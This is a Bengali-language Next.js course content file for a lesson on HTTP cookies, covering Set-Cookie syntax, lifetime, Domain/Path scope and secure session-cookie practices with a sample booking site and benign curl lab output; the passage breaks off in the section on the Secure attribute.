/**
 * What: Module 06 Lesson 05, Cookies. How a server asks a browser to keep a small note, how the
 * browser decides which requests carry it (Domain, Path, Secure, SameSite), how cookies are
 * stolen or abused (sniffing, XSS, CSRF), third-party cookies as of 2026, and how to set, read
 * and delete cookies in Node, fetch and Next.js.
 *
 * Why: HTTP forgets every request (Lesson 02), and almost every login bug, CSRF hole and "works on
 * localhost, fails in production" cookie problem comes from one of these rules. The lesson teaches
 * each rule with Island Tours values and a lab whose output was captured on a real machine. What a
 * session holds, and sessions against JWT, belong to Lesson 06.
 */
import Link from "next/link";
import {
  ContentList,
  ContentParagraph,
  ListItem,
  SectionTitle,
} from "../../../components/course/content-components";
import {
  CookieScopeLab,
  SameSiteLab,
  SiteOriginLab,
} from "../../../components/course/topics/http/cookie-animations";
import {
  CookieRoundTripDiagram,
  CsrfStorySplit,
  JarVsHeaderSplit,
  OriginSiteDiagram,
  SetCookieAnatomyDiagram,
  ThirdPartyCookieDiagram,
} from "../../../components/course/topics/http/cookie-diagrams";
import { IslandToursBrief } from "../../../components/course/topics/island-tours/project-brief";
import {
  CONTENT_TYPES,
  INFO_BOX_VARIANTS,
  TopicData,
} from "../../../types/content";

const linkClass = "text-primary underline underline-offset-4";

export const cookiesContent: TopicData = {
  id: "cookies",
  introduction: {
    badge: "MODULE 06 · LESSON 05",
    title: <SectionTitle>Server সব ভুলে যায়, তাই Browser এর পকেটে একটা নোট</SectionTitle>,
    description: (
      <div className="space-y-4">
        <ContentParagraph>
          পর্যটক ফোনে Island Tours খুলে Login করলেন। তারপর Saint Martin এর ট্যুরের পাতায়
          গেলেন, দুইজন অতিথি বেছে নিলেন, একবার ফিরে গিয়ে Sundarbans এর পাতাও দেখে এলেন। প্রতিটা
          পাতার কোণে তাঁর নাম লেখা, তিনি যে Login করা, সেটা সাইট ভোলেনি। খুব স্বাভাবিক লাগে।
          কিন্তু লেসন ০২ মনে করুন। HTTP Stateless, প্রতিটা Request Server এর কাছে একজন অচেনা
          মানুষ। আগের Request টা কে পাঠিয়েছিল, Server জানে না, জানার কোনো উপায়ও Protocol এ নেই।
        </ContentParagraph>
        <ContentParagraph>
          তাহলে পঞ্চম পাতায় এসে Server কীভাবে জানল এটা সেই একই মানুষ? উত্তরটা একটা ছোট্ট নোট।
          Login এর সময় Server Browser কে একটা নোট ধরিয়ে দিয়েছিল আর বলেছিল, এরপর যতবার আসবেন,
          এটা দেখাবেন। Browser কথা রেখেছে, প্রতিটা Request এ নোটটা জুড়ে দিয়েছে। এই নোটের নাম
          Cookie।
        </ContentParagraph>
        <ContentParagraph>
          এই লেসন শেষে আপনি জানবেন Cookie কীভাবে বসে আর কীভাবে ফেরত যায়, Browser কীভাবে ঠিক করে
          কোন Request এ কোন Cookie যাবে, Domain, Path, Secure, HttpOnly আর SameSite প্রতিটা আসলে
          কী করে, Origin আর Site এর তফাত, CSRF নামের আক্রমণটা কীভাবে কাজ করে আর কীভাবে আটকাতে হয়,
          Third-party Cookie এর ২০২৬ সালের আসল অবস্থা, আর Node, fetch আর Next.js এ Cookie বসানো,
          পড়া আর মোছার ঠিক নিয়ম। আর DevTools আর curl দিয়ে প্রতিটা নিয়ম নিজের চোখে দেখবেন। নোটের
          ভেতরে আসলে কী লেখা থাকে, Session আর JWT এর লড়াই, সেটা পরের লেসনের জন্য তোলা থাকল।
        </ContentParagraph>
      </div>
    ),
    quote: {
      text: "ক্লোকরুমে ব্যাগ জমা দিলে লোকটা আপনার চেহারা মনে রাখেন না। তিনি একটা টোকেন দেন, ৪৭ নম্বর। ফেরার সময় টোকেনটা দেখালেই ব্যাগ পেয়ে যান। টোকেনের ভেতরে ব্যাগ নেই, আছে শুধু একটা নম্বর, যার মানে জানেন কেবল ক্লোকরুমের লোকটা।",
      author: "Cookie",
      role: "Lesson 05",
    },
  },
  sections: [
    /* ---------------------------------------------------------------- 1 */
    {
      id: "why-cookies",
      subHeader: { index: "001", title: "Theory" },
      title: <SectionTitle>Server এর স্মৃতি নেই, তাই নোটটা থাকে আপনার কাছে</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                লেসন ০২ এ দেখেছেন, HTTP ইচ্ছা করেই কিছু মনে রাখে না। প্রতিটা Request নিজের
                পরিচয় নিজে বহন করে, আগের কোনো Request এর উপর নির্ভর করে না। এটা দুর্বলতা নয়, এটাই
                HTTP এর শক্তি। Server কিছু মনে না রাখলে যেকোনো Server যেকোনো Request এর উত্তর দিতে
                পারে, Server Restart হলে কারো কিছু হারায় না, আর ভিড় বাড়লে দশটা Server পাশাপাশি
                বসানো যায়।
              </ContentParagraph>
              <ContentParagraph>
                কিন্তু একটা Booking সাইটের তো মনে রাখতেই হয়। কে Login করা, কার ঝুড়িতে কোন ট্যুর,
                কে বাংলায় পড়তে চান আর কে অন্ধকার Theme এ। মনে রাখার দরকার আছে, আবার Protocol কে
                মনে রাখতে বলাও যাবে না। সমাধানটা ক্লোকরুমের টোকেনের মতো। ক্লোকরুমের লোকটা হাজার
                মানুষের চেহারা মনে রাখেন না। তিনি আপনার ব্যাগ একটা তাকে রাখেন আর আপনাকে একটা টোকেন
                দেন। ফেরার সময় আপনি টোকেন দেখান, তিনি তাক থেকে ব্যাগ নামিয়ে দেন।
              </ContentParagraph>
              <ContentParagraph>
                ওয়েবে টোকেনটার নাম <strong>Cookie</strong>। Cookie হলো নাম আর মানের একটা ছোট্ট
                জোড়া, যেমন <code>theme=dark</code>, যেটা Server একটা Response এর সাথে পাঠিয়ে
                Browser কে বলে রেখে দিতে, আর Browser পরের প্রতিটা মানানসই Request এ সেটা নিজে থেকেই
                ফেরত পাঠায়। ক্লোকরুমের তাকটা থাকে Server এর দিকে, Island Tours এ সেটা Redis।
                টোকেনটা থাকে Browser এর কাছে। আর টোকেনের নম্বর দেখে তাক থেকে জিনিস খুঁজে বের করার
                কাজটা Server এর Code এর।
              </ContentParagraph>
              <ContentParagraph>
                নামটা এসেছে পুরনো Programmer দের একটা কথা থেকে, Magic Cookie, মানে এমন একটুখানি
                তথ্য যেটা একটা Program আরেকটাকে দেয় আর পরে ফেরত চায়, ভেতরে কী আছে না বুঝেই। ১৯৯৪
                সালে Netscape Browser এর একটা কেনাকাটার সাইটের ঝুড়ি মনে রাখার দরকার থেকে ওয়েবের
                Cookie এর জন্ম। আজ প্রায় প্রতিটা সাইট তিনটা কাজে Cookie ব্যবহার করে।
              </ContentParagraph>
              <ContentList>
                <ListItem>
                  <strong>Session Management:</strong> Login মনে রাখা, ঝুড়ি মনে রাখা, একটা
                  Form এর মাঝপথের অবস্থা মনে রাখা। Island Tours এর <code>__Host-session</code>{" "}
                  এই দলের।
                </ListItem>
                <ListItem>
                  <strong>Personalization:</strong> ভাষা, Theme, শেষবার কোন শহর বেছেছিলেন।
                  Island Tours এর <code>theme</code> আর <code>lang</code> এই দলের।
                </ListItem>
                <ListItem>
                  <strong>Tracking:</strong> একজন মানুষ কোন কোন পাতা ঘুরলেন, কোন বিজ্ঞাপন থেকে
                  এলেন, অন্য সাইটেও তাঁকে চেনা যায় কি না। এই দলটার জন্যই Browser গুলো গত কয়েক বছরে
                  Cookie এর নিয়ম কড়া করেছে, সেকশন ০১০ এ দেখবেন।
                </ListItem>
              </ContentList>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.CONCEPT,
          title: "Cookie কোনো Program নয়",
          content: (
            <p>
              Cookie শব্দটা শুনলে অনেকে ভয় পান, যেন এটা যন্ত্রে ঢুকে কিছু করে ফেলবে। Cookie শুধু
              কিছু অক্ষর। এটা নিজে চলতে পারে না, আপনার ফাইল পড়তে পারে না, অন্য সাইটের Cookie ও
              ছুঁতে পারে না। Cookie এর আসল ক্ষমতা হলো পরিচয়। যার হাতে আপনার Login Cookie, Server এর
              চোখে সে আপনিই। তাই এই লেসনের প্রায় সব নিয়ম আসলে একটা প্রশ্নের উত্তর: এই টোকেনটা যেন
              ভুল হাতে না যায়, আর ভুল সময়ে ব্যবহার না হয়।
            </p>
          ),
        },
      ],
    },
    /* ---------------------------------------------------------------- 2 */
    {
      id: "round-trip",
      subHeader: { index: "002", title: "The Round Trip" },
      title: <SectionTitle>Set-Cookie যায়, Cookie ফিরে আসে</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                পুরো ব্যবস্থাটা দাঁড়িয়ে আছে দুইটা Header এর উপর, যাদের চেহারা আপনি লেসন ০৪ এ
                দেখেছেন। Server থেকে Browser এ যায় <code>Set-Cookie</code>, Browser থেকে Server এ
                ফেরে <code>Cookie</code>। নামে এক রকম, কাজে আর গঠনে বেশ আলাদা। পর্যটক Login করলে
                Island Tours এর Server যে Response পাঠায়, তার শুরুটা এরকম।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "http",
          filename: "login-response.http",
          code: `HTTP/2 200
content-type: application/json; charset=utf-8
set-cookie: __Host-session=Gx2f9Q...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=1209600
set-cookie: theme=dark; Path=/; Secure; Max-Age=31536000; SameSite=Lax

{"id":"usr_42","signedIn":true}`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                দুইটা Cookie, তাই দুইটা আলাদা <code>set-cookie</code> লাইন। এটা নিয়ম, ঐচ্ছিক নয়।
                অন্য Header এর মান কমা দিয়ে এক লাইনে জোড়া যায়, কিন্তু Set-Cookie যায় না, কারণ
                একটা Cookie এর তারিখের ভেতরেই কমা থাকতে পারে (<code>Expires=Sat, 14 Nov 2026</code>
                )। HTTP/2 তে Header এর নাম ছোট হাতের অক্ষরে আসে, লেসন ০২ তে দেখেছেন, তাই এখানে{" "}
                <code>set-cookie</code>। মানে একই।
              </ContentParagraph>
              <ContentParagraph>
                এরপর পর্যটক Saint Martin এর পাতা খুললেন। Browser এর পাঠানো Request এ এবার একটা
                নতুন লাইন আছে, যেটা কোনো Code লেখেনি, Browser নিজে জুড়েছে।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "http",
          filename: "next-request.http",
          code: `GET /api/me HTTP/2
host: islandtours.example
accept: application/json
cookie: __Host-session=Gx2f9Q...; theme=dark`,
        },
        { type: CONTENT_TYPES.CUSTOM, component: <CookieRoundTripDiagram /> },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                দুইটা Header পাশাপাশি রাখলে চারটা তফাত চোখে পড়ে, আর এই চারটা মনে রাখলেই বাকি
                লেসন সহজ হয়ে যায়।
              </ContentParagraph>
              <ContentList>
                <ListItem>
                  <strong>দিক:</strong> Set-Cookie শুধু Response এ থাকে, Cookie শুধু Request এ।
                  Browser কখনো Set-Cookie পাঠায় না, Server কখনো Cookie পাঠায় না।
                </ListItem>
                <ListItem>
                  <strong>সংখ্যা:</strong> প্রতিটা Cookie এর জন্য একটা করে Set-Cookie লাইন। কিন্তু
                  Cookie Header একটাই, তাতে সব Cookie সেমিকোলন আর একটা ফাঁকা জায়গা দিয়ে জোড়া।
                </ListItem>
                <ListItem>
                  <strong>তথ্যের পরিমাণ:</strong> Set-Cookie এ নাম, মান আর একগাদা নির্দেশ। Cookie
                  Header এ শুধু নাম আর মান। নির্দেশগুলো ফেরত আসে না, সেকশন ০০৩ এ বিস্তারিত।
                </ListItem>
                <ListItem>
                  <strong>কে কাজটা করে:</strong> Cookie জুড়ে দেওয়া Browser এর কাজ, আপনার
                  JavaScript এর নয়। পাতা, ছবি, CSS, একই সাইটের API, যে Request ই যাক, নিয়ম মিললে
                  Browser জুড়ে দেবে। এই সুবিধাটাই আবার CSRF আক্রমণের দরজা, সেকশন ০০৯ এ দেখবেন।
                </ListItem>
              </ContentList>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.TIP,
          title: "Caddy Cookie ছোঁয় না",
          content: (
            <p>
              Island Tours এ Browser আর App এর মাঝে Caddy বসে আছে, Port 443 এ TLS খুলে Request টা{" "}
              <code>127.0.0.1:3000</code> এ App এর কাছে পাঠায়। Cookie আর Set-Cookie দুইটাই Caddy
              হুবহু পার করে দেয়, একটা অক্ষরও বদলায় না। তাই Cookie এর কোনো সমস্যা খুঁজতে গেলে প্রথম
              সন্দেহ Proxy নয়, App এর পাঠানো Set-Cookie লাইনটা। ব্যতিক্রম একটাই: কেউ ইচ্ছা করে Proxy
              তে Header মুছে দেওয়ার নিয়ম লিখলে। আপনার Proxy Config এ এমন কিছু আছে কি না, একবার
              দেখে নেবেন।
            </p>
          ),
        },
      ],
    },
    /* ---------------------------------------------------------------- 3 */
    {
      id: "anatomy",
      subHeader: { index: "003", title: "Anatomy" },
      title: <SectionTitle>একটা Set-Cookie লাইনের ভেতরে কী কী থাকে</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentParagraph>
              Island Tours এর Login Cookie এর লাইনটা এবার ভাগ ভাগ করে খুলি। প্রথম সেমিকোলনের
              আগের অংশটা Cookie নিজে, নাম আর মান। পরের প্রতিটা অংশ একটা <strong>Attribute</strong>
              , মানে Browser এর জন্য একটা নির্দেশ। প্রতিটা Attribute এর নিজের সেকশন আছে সামনে,
              এখানে শুধু পুরো চেহারাটা।
            </ContentParagraph>
          ),
        },
        { type: CONTENT_TYPES.CUSTOM, component: <SetCookieAnatomyDiagram /> },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                নাম আর মান নিয়ে তিনটা নিয়ম জানা দরকার। এক, নাম Case Sensitive, <code>Theme</code>{" "}
                আর <code>theme</code> দুইটা আলাদা Cookie। দুই, মানের ভেতরে সেমিকোলন, কমা, ফাঁকা
                জায়গা আর উদ্ধৃতিচিহ্ন রাখা যায় না, কারণ এগুলো দিয়েই লাইনটা ভাগ হয়। বাংলা লেখা বা
                এমন কিছু রাখতে হলে আগে Encode করতে হয়, লেসন ০১ এর Percent Encoding এর মতো। তিন,
                Browser এর কাছে মানটার কোনো অর্থ নেই, সে শুধু অক্ষরগুলো যত্ন করে রেখে দেয় আর ফেরত
                পাঠায়।
              </ContentParagraph>
              <ContentParagraph>
                Browser Cookie গুলো রাখে যে জায়গায়, তার নাম <strong>Cookie Jar</strong>, মানে
                Cookie এর বয়াম। Jar এ একটা Cookie এর পরিচয় শুধু নাম দিয়ে নয়, তিনটা জিনিস মিলিয়ে:
                নাম, Domain আর Path। একই নামের দুইটা Cookie আলাদা Path এ থাকলে Jar এ দুইটা আলাদা
                জিনিস, আর দুইটার Path ই মিললে Browser দুইটাই পাঠায়, লম্বা Path এর টা আগে। এই
                তিনজোড়া পরিচয়টা মনে রাখুন, Cookie মোছার সময় ঠিক এটাই কাজে লাগবে।
              </ContentParagraph>
              <ContentParagraph>
                আর সবচেয়ে গুরুত্বপূর্ণ কথা, Attribute গুলো একমুখী। Server পাঠায়, Browser মানে,
                কিন্তু ফেরত দেয় না। নিচের ছবিটা দেখুন।
              </ContentParagraph>
            </div>
          ),
        },
        { type: CONTENT_TYPES.CUSTOM, component: <JarVsHeaderSplit /> },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentParagraph>
              এর একটা সোজা ফল আছে। Server যখন একটা Cookie পায়, সে জানে না সেটা কবে বসানো হয়েছিল,
              কবে মেয়াদ শেষ, Secure ছিল কি না, এমনকি নিজেই বসিয়েছিল কি না। Cookie এর মেয়াদ যদি
              আপনার নিরাপত্তার অংশ হয়, যেমন Login ১৪ দিন পর শেষ হবে, তাহলে মেয়াদটা Server এর দিকেও
              লিখে রাখতে হবে। Island Tours এ Redis এর প্রতিটা Session এর নিজের TTL আছে, Cookie এর
              Max-Age এর সাথে মিলিয়ে। Browser এর হিসাব মানুষ বদলে দিতে পারে, Redis এর হিসাব পারে না।
            </ContentParagraph>
          ),
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.WARNING,
          title: "Cookie এর মান ব্যবহারকারীর হাতে",
          content: (
            <p>
              Jar টা ব্যবহারকারীর যন্ত্রে, তাই তিনি চাইলে DevTools খুলে যেকোনো Cookie এর মান বদলে
              দিতে পারেন, নতুন Cookie বানাতে পারেন, curl দিয়ে যা খুশি পাঠাতে পারেন। তাই কখনো{" "}
              <code>role=admin</code> বা <code>user_id=42</code> এর মতো কিছু Cookie তে রেখে বিশ্বাস
              করবেন না। Cookie তে রাখুন এমন একটা লম্বা Random নম্বর, যেটা আন্দাজ করা অসম্ভব, আর তার
              মানে খুঁজুন Server এর নিজের খাতায়। ক্লোকরুমের টোকেনে ৪৭ লেখা থাকে, ব্যাগের মালিকের নাম
              নয়। মান বদলানো ঠেকাতে মানের সাথে একটা Signature জুড়ে দেওয়ার কৌশলও আছে, সেটা পরের
              লেসনের JWT অংশে।
            </p>
          ),
        },
      ],
    },
    /* ---------------------------------------------------------------- 4 */
    {
      id: "lifetime",
      subHeader: { index: "004", title: "Lifetime" },
      title: <SectionTitle>কতদিন বাঁচবে: Session Cookie আর Persistent Cookie</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                একটা Cookie কতদিন Jar এ থাকবে, সেটা ঠিক করে দুইটা Attribute এর যেকোনো একটা।
                কোনোটাই না থাকলে সেটা <strong>Session Cookie</strong>। নামটা বিভ্রান্তিকর, এর সাথে
                Login Session এর কোনো সম্পর্ক নেই। এখানে Session মানে Browser এর একটা চালু থাকার
                সময়। Browser পুরো বন্ধ হলে Session Cookie মুছে যাওয়ার কথা।
              </ContentParagraph>
              <ContentParagraph>
                কথা আছে, কিন্তু সবসময় মোছে না। Chrome বা Firefox এ যদি চালু থাকে আগের Tab গুলো
                আবার খুলুন জাতীয় Setting, Browser Session Cookie গুলোও ফিরিয়ে আনে, যেন বন্ধই হয়নি।
                আর শুধু একটা Tab বন্ধ করলে কখনোই মোছে না। তাই Session Cookie কে নিরাপত্তার ভরসা
                বানাবেন না। Login কতক্ষণ থাকবে, সেটা Server এর দিকে নিজের TTL দিয়ে ঠিক করুন।
              </ContentParagraph>
              <ContentParagraph>
                মেয়াদ দিলে সেটা <strong>Persistent Cookie</strong>, Browser বন্ধ খোলার পরেও থাকে,
                মেয়াদ শেষ না হওয়া পর্যন্ত।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.COMPARE_TABLE,
          headers: ["Attribute", "লেখার ধরন", "মানে", "কখন বেছে নেবেন"],
          rows: [
            [
              <code key="a">Max-Age</code>,
              <code key="b">Max-Age=1209600</code>,
              "এখন থেকে এত সেকেন্ড পর মেয়াদ শেষ",
              "প্রায় সবসময়। গোনা শুরু হয় Browser এর হাতে পৌঁছানোর মুহূর্ত থেকে, ঘড়ি ভুল হলেও ঠিক থাকে",
            ],
            [
              <code key="a">Expires</code>,
              <code key="b">Expires=Sat, 14 Nov 2026 06:30:00 GMT</code>,
              "ঠিক এই তারিখ আর সময়ে মেয়াদ শেষ",
              "শুধু খুব পুরনো Browser এর জন্য। ব্যবহারকারীর ঘড়ি ভুল হলে Cookie আগে বা পরে মরে",
            ],
            [
              "দুইটাই",
              <code key="b">Max-Age=60; Expires=...</code>,
              "Max-Age জেতে",
              "পুরনো আর নতুন দুই রকম Browser সামলাতে কেউ কেউ দুইটাই দেন",
            ],
            [
              "কোনোটাই না",
              <code key="b">last_search=sajek-valley; Path=/</code>,
              "Session Cookie",
              "যে জিনিস Browser বন্ধ হলে হারালেও ক্ষতি নেই",
            ],
            [
              "মোছার জন্য",
              <code key="b">Max-Age=0</code>,
              "এখনই মেয়াদ শেষ, Browser মুছে ফেলে",
              "Logout বা একটা Cookie বাতিল করতে, সেকশন ০১২",
            ],
          ],
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                মেয়াদ যত খুশি লম্বা দেওয়া যায় না। আজকের Cookie এর নিয়মের নতুন খসড়া, RFC 6265bis,
                বলে Browser সর্বোচ্চ ৪০০ দিন মানবে, আর Chrome ২০২২ সাল থেকে সেটাই করে। আপনি দশ বছর
                লিখলেও Cookie ৪০০ দিন পরে মরবে। Safari আরেক ধাপ কড়া: Page এর JavaScript দিয়ে
                বসানো Cookie এর আয়ু সে ৭ দিনে আটকে দেয়। তাই যে Cookie অনেকদিন টিকিয়ে রাখা দরকার,
                সেটা Server এর Set-Cookie দিয়েই বসান, Script দিয়ে নয়।
              </ContentParagraph>
              <ContentParagraph>
                Island Tours এর তিনটা Cookie তিনটা আলাদা সিদ্ধান্ত। <code>__Host-session</code> ১৪
                দিন, কারণ মোবাইলে মানুষ বারবার Login করতে বিরক্ত হন, আবার মাসের পর মাস খোলা থাকাটা
                ঝুঁকি। <code>theme</code> ৩৬৫ দিন, হারালে বড়জোর পাতাটা একবার সাদা দেখাবে।{" "}
                <code>lang</code> এর মেয়াদও ৩৬৫ দিন, কারণ বাংলা বেছে নেওয়া মানুষ পরের সপ্তাহেও বাংলাই
                চাইবেন। সংখ্যাগুলো Code এ লেখা নেই, Environment Variable থেকে আসে, যেমন{" "}
                <code>SESSION_TTL_SECONDS</code>, আর না থাকলে App চালুই হয় না।
              </ContentParagraph>
            </div>
          ),
        },
      ],
    },
    /* ---------------------------------------------------------------- 5 */
    {
      id: "scope",
      subHeader: { index: "005", title: "Scope" },
      title: <SectionTitle>কাকে দেবে: Domain, Path আর একটা চমক, Port</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                প্রতিটা Request এর আগে Browser Jar এর প্রতিটা Cookie কে কয়েকটা প্রশ্ন করে। প্রথম
                প্রশ্ন, এই নামের Server এ কি এই Cookie এর যাওয়ার কথা? উত্তর দেয় <strong>Domain</strong>{" "}
                Attribute, আর এখানেই সবচেয়ে বেশি মানুষ উল্টো বোঝেন।
              </ContentParagraph>
              <ContentList>
                <ListItem>
                  <strong>Domain লেখা নেই:</strong> Cookie টাকে বলে <strong>Host-only</strong>।
                  যে নাম থেকে বসেছে, শুধু হুবহু সেই নামে যাবে। islandtours.example এর Host-only
                  Cookie blog.islandtours.example বা admin.islandtours.example কখনো পাবে না।
                </ListItem>
                <ListItem>
                  <strong>Domain=islandtours.example লেখা:</strong> এবার islandtours.example নিজে
                  তো পাবেই, সাথে তার নিচের প্রতিটা Subdomain ও, blog, admin, api, যা কিছু। মানে
                  Domain লিখলে Cookie এর এলাকা বাড়ে, কমে না। অনেকে ভাবেন Domain লিখে নিরাপদ করছেন,
                  আসলে দরজা আরও খুলে দিচ্ছেন।
                </ListItem>
              </ContentList>
              <ContentParagraph>
                Domain এ কী লেখা যাবে, তারও কড়া নিয়ম আছে। একটা Server শুধু নিজের নাম বা নিজের উপরের
                নাম লিখতে পারে। blog.islandtours.example চাইলে <code>Domain=islandtours.example</code>{" "}
                লিখতে পারে, কিন্তু <code>Domain=seagulltours.example</code> লিখলে Browser Cookie
                টাই ফেলে দেয়, কোনো Error ও দেখায় না। আর <code>Domain=example</code> এর মতো একটা
                Public Suffix লেখাও নিষেধ, সেটা কেন, সেকশন ০০৭ এ বুঝবেন। পুরনো লেখায় দেখবেন{" "}
                <code>Domain=.islandtours.example</code>, সামনে একটা বিন্দু। আজকের Browser সেই
                বিন্দুটা উপেক্ষা করে, মানে একই।
              </ContentParagraph>
              <ContentParagraph>
                নিচের পরীক্ষাটা এই যন্ত্রেই চালানো। curl এর <code>--resolve</code> দিয়ে, যেটা
                Module 04 এর DNS Propagation লেসনে দেখেছেন, তিনটা নামকেই নিজের যন্ত্রে পাঠানো
                হয়েছে। islandtours.example থেকে তিনটা Cookie বসানোর চেষ্টা হলো: একটা Host-only, একটা{" "}
                <code>Domain=islandtours.example</code>, আর একটা অন্য সাইটের নামে। পুরো Script টা
                Lab এর তিন নম্বর ধাপে আছে, এখানে শুধু ফলাফল।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "bash",
          filename: "3-domain.sh, এই যন্ত্রের আসল ফলাফল",
          code: `$ LAB_PORT=47650 bash 3-domain.sh
set on islandtours.example:47650
--- islandtours.example
  "cookieHeader": "host_only=1; shared=1"
--- blog.islandtours.example
  "cookieHeader": "shared=1"
--- seagulltours.example
  "cookieHeader": null
--- jar
.islandtours.example	TRUE	/	FALSE	0	shared	1
islandtours.example	FALSE	/	FALSE	0	host_only	1`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                ফলাফলটা পড়ুন। islandtours.example দুইটাই পেল। blog পেল শুধু{" "}
                <code>shared</code>, কারণ সেটাতেই Domain লেখা ছিল। seagulltours.example কিছুই পেল
                না। আর তৃতীয় Cookie, <code>foreign</code>, Jar এ নেই ই, curl সেটা ঢুকতেই দেয়নি।
                Jar এর লাইনে দেখুন, Domain Cookie এর নামের আগে একটা বিন্দু আর পাশে{" "}
                <code>TRUE</code>, মানে Subdomain ও পাবে। Host-only টার পাশে <code>FALSE</code>।
              </ContentParagraph>
              <ContentParagraph>
                দ্বিতীয় প্রশ্ন, এই Path এ কি এই Cookie এর যাওয়ার কথা? উত্তর দেয় <strong>Path</strong>।{" "}
                <code>Path=/api</code> মানে Request এর Path যদি ঠিক <code>/api</code> হয়, অথবা{" "}
                <code>/api/</code> দিয়ে শুরু হয়। <code>/api/bookings</code> পাবে।{" "}
                <code>/api-docs</code> পাবে না, যদিও অক্ষরে <code>/api</code> দিয়েই শুরু, কারণ মিল
                হতে হয় পুরো একটা ভাগ ধরে। Path না লিখলে Browser নিজে একটা বেছে নেয়, যে পাতা Cookie
                বসিয়েছে তার Folder টা, আর সেটা প্রায়ই অবাক করে। তাই প্রায় সব Cookie তে{" "}
                <code>Path=/</code> লিখে দেওয়াই নিয়ম। মনে রাখবেন, Path সুবিধার জিনিস, নিরাপত্তার
                দেয়াল নয়। একই Origin এর অন্য Path এর পাতা চাইলে নানা কৌশলে সেই Cookie পড়ে ফেলতে পারে।
              </ContentParagraph>
              <ContentParagraph>
                আর এবার চমকটা। Cookie <strong>Port</strong> দেখে না। <code>localhost:3000</code>{" "}
                এ চলা আপনার Next.js আর <code>localhost:5173</code> এ চলা আরেকটা Project একই Jar
                ভাগ করে। দুইটাই যদি <code>session</code> নামে Cookie বসায়, একটা আরেকটাকে মুছে দেবে,
                আর আপনি বুঝতে পারবেন না কেন একটা Project এ Login করলে আরেকটা থেকে বেরিয়ে যান। লেসন
                ০১ এ Origin শিখেছিলেন Scheme, Host আর Port মিলিয়ে। Cookie এর নিয়ম তার চেয়ে পুরনো, সে
                শুধু Host দেখে।
              </ContentParagraph>
            </div>
          ),
        },
        { type: CONTENT_TYPES.CUSTOM, component: <CookieScopeLab /> },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.IMPORTANT,
          title: "Login Cookie এ Domain দেবেন না",
          content: (
            <p>
              Island Tours এর blog.islandtours.example চালায় একটা বাইরের Agency, অন্য Server এ।
              Session Cookie এ <code>Domain=islandtours.example</code> থাকলে পর্যটকের Login টোকেন
              প্রতিটা Blog পাতার Request এ সেই Server এ যেত, তাদের Access Log এ জমা হতো, আর Blog এ
              একটা দুর্বলতা মানেই Booking সাইটের প্রতিটা Account ঝুঁকিতে। তাই Login Cookie
              Host-only। Subdomain গুলোর সত্যিই কিছু ভাগ করার দরকার হলে, যেমন ভাষা, তার জন্য আলাদা,
              নিরীহ একটা Cookie, এখানে <code>lang</code>।
            </p>
          ),
        },
      ],
    },
    /* ---------------------------------------------------------------- 6 */
    {
      id: "secure-httponly",
      subHeader: { index: "006", title: "Secure and HttpOnly" },
      title: <SectionTitle>চুরির দুই রাস্তা, আর দুইটা তালা: Secure আর HttpOnly</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                Login Cookie যার হাতে, Server এর চোখে সে-ই পর্যটক। এই কাজের নাম{" "}
                <strong>Session Hijacking</strong>, কারো Session ছিনিয়ে নেওয়া। Cookie চুরির দুইটা
                বড় রাস্তা আছে, আর প্রতিটার জন্য একটা Attribute।
              </ContentParagraph>
              <ContentParagraph>
                <strong>প্রথম রাস্তা, তার থেকে।</strong> ধরুন পর্যটক কক্সবাজারের একটা ক্যাফের খোলা
                Wi-Fi তে বসে আছেন, আর সাইটটা সাধারণ <code>http://</code> তে চলছে। Module 02 তে
                দেখেছেন, একটা Packet পথে কত হাত ঘোরে: ক্যাফের Router, ISP, মাঝের প্রতিটা Hop। HTTPS
                ছাড়া Cookie Header টা খোলা চিঠির মতো যায়, পথের যে কেউ পড়তে পারে। ২০১০ সালে Firesheep
                নামের একটা Firefox Extension ঠিক এটাই দেখিয়েছিল। ক্যাফেতে বসে একটা বোতাম চাপলেই আশেপাশের
                মানুষের Facebook আর Twitter এর Session দেখা যেত, এক ক্লিকে তাঁদের Account এ ঢোকা যেত।
                তারপর থেকেই বড় সাইটগুলো পুরোপুরি HTTPS এ চলে যায়।
              </ContentParagraph>
              <ContentParagraph>
                তালাটার নাম <strong>Secure</strong>। Secure লেখা Cookie Browser শুধু HTTPS Request এ
                পাঠায়, সাধারণ HTTP তে কখনো না। আর আজকের Browser আরও একটা কাজ করে: একটা{" "}
                <code>http://</code> পাতা নতুন Secure Cookie বসাতেও পারে না, পুরনো Secure Cookie
